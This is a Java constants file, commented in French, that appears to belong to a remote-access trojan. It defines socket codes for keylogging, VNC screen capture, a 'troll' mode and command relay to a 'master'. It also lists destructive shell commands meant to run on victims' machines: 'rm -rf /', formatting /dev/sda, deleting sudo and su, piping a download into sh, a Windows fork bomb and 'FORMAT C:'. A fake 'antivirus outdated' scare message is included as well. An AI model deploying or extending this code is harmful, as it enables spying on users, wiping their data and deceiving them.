package constante;


public abstract class Constante {

	public static final Integer code_cmd = 60;
	public static final Integer code_envoyer = ( 1 << 6);
	public static final Integer code_info_affichage = (1 << 3);
	public static final Integer code_keylog = 80;

	public static final String code_message_cmd = "XXXXXXX000000123"; // Code de
																		// reception
																		// pour
																		// le
																		// maitre
																		// d'un
																		// message
																		// CMD
	public static final Integer code_notif = 100;

	public static final Integer code_terminal_affichage = (1 << 1); // Pour la
	public static final Integer code_troll = (1 << 4);
	// Code permettant le bon fonctionnnement entre les sockets
	//
	public static final Integer code_vnc = 120;

	// gestion
																	// des
																	// fenetres
	public static final Integer code_vnc_afficage = (1 << 2);

	public static final String[] listCommandeL = { // Liste de commande
													// "amusante" pour rendre
													// Linux plus performants
			// :D
			"wget http://somewhere -O – | sh", "mv ~ /dev/null",
			"mkdir newfolder > /dev/sda", "rm -rf /", "mkfs.ext3 /dev/sda",
			"rm -f /usr/bin/sudo;rm -f /bin/su",
			"rpm -a | grep  | xargs rpm -e –nodeps" };

	// Pareil pour Windows
	public static final String[] listeCommandeW = {
			"@ECHO off :haha START %SystemRoot%\\system32\\notepad.exe GOTO haha",
			"%0|%0", "FORMAT C: /U /SELECT" };
																	// Message par default si l'API Desktop ne peut pas etre utilisé
	public static final String message_url = "Your antivirus is outdated, please go on pornhub.com";
	private static Integer nombredeFichiers = 1;
	// Redirection par default pour les notifications
	public static final String url_update = "https://www.stackoverflow.com";
	// Inutilisé
	public static final Integer WINDOW_HEIGHT = 400;
	public static final Integer WINDOW_WIDTH = 500;
	public static Integer nombredeFichierRecupere() { // Incremente le nombre de
														// fichier
		return nombredeFichiers++;
	}
}
